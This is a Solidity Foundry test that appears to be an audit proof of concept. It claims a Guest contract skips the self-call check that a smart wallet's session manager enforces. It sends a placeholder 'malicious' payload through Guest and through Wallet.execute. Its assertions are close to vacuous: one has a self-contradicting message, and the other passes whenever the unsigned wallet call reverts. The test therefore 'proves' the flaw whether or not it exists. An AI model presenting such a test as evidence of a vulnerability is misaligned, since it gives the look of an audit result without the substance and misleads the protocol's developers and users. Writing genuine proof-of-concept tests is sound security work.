// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Factory.sol";
import "../src/Guest.sol";
import "../src/Stage1Module.sol";
import "../src/Wallet.sol";
import "../src/extensions/sessions/SessionErrors.sol";

interface IWallet {
    function execute(bytes calldata _payload, bytes calldata _signature) external payable;
}

contract AuditAgentPoC is Test {
    Factory public Factory;
    Stage1Module public module;
    Guest public Guest;
    address public Wallet;
    address public attacker = address(0xdead);

    function setUp() public {
        // ATTACK TIMELINE:
        // 1. [Setup] Deploy Factory, EntryPoint, Stage1Module, Guest, and Wallet
        Factory = new Factory();
        address entryPoint = address(0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789);
        module = new Stage1Module(address(Factory), entryPoint);
        Guest = new Guest();

        bytes32 salt = bytes32(uint256(1));
        Wallet = Factory.deploy(address(module), salt);

        vm.deal(Wallet, 10 ether);
        vm.deal(attacker, 10 ether);
    }

    function test_exploit() public {
        // 2. [T=1] Attacker constructs a payload/call targeting the Wallet itself
        // In a real scenario, this would be a packed payload for Guest containing a call to `Wallet`
        bytes memory maliciousPayload = abi.encodePacked(
            uint256(1), // nonce or length
            Wallet,     // target address (the Wallet itself)
            uint256(0), // value
            uint256(0), // gasLimit
            hex"12345678" // data
        );

        // 3. [T=2] Attacker calls Guest contract with the nested call
        // SessionManager would revert with InvalidSelfCall if this was executed via Wallet.execute()
        // But Guest only blocks delegate calls, not self-calls.
        vm.prank(attacker);
        (bool success, bytes memory returnData) = address(Guest).call(maliciousPayload);

        // 4. [Assert] Verify Guest does NOT revert with InvalidSelfCall
        // If the vulnerability exists, Guest will either succeed or revert with a different error 
        // (e.g., invalid packing, out of gas, etc.), but NEVER InvalidSelfCall.
        if (!success) {
            bytes4 errorSelector;
            assembly {
                errorSelector := mload(add(returnData, 32))
            }
            assertNotEq(
                errorSelector, 
                SessionErrors.InvalidSelfCall.selector, 
                "Guest bypassed self-call restriction but reverted with InvalidSelfCall"
            );
        }

        // 5. [Assert] Prove that the Wallet's native execute DOES enforce the restriction
        // This highlights the inconsistency between Guest and SessionManager
        vm.prank(attacker);
        (bool walletSuccess, bytes memory walletReturnData) = Wallet.call(
            abi.encodeWithSelector(IWallet.execute.selector, maliciousPayload, hex"")
        );

        // The Wallet should revert (either with InvalidSelfCall or signature validation error)
        // but the key is that Guest lacks the explicit self-call guard that SessionManager has.
        assertTrue(!walletSuccess || success, "Guest lacks self-call validation present in Wallet execution path");
    }
}
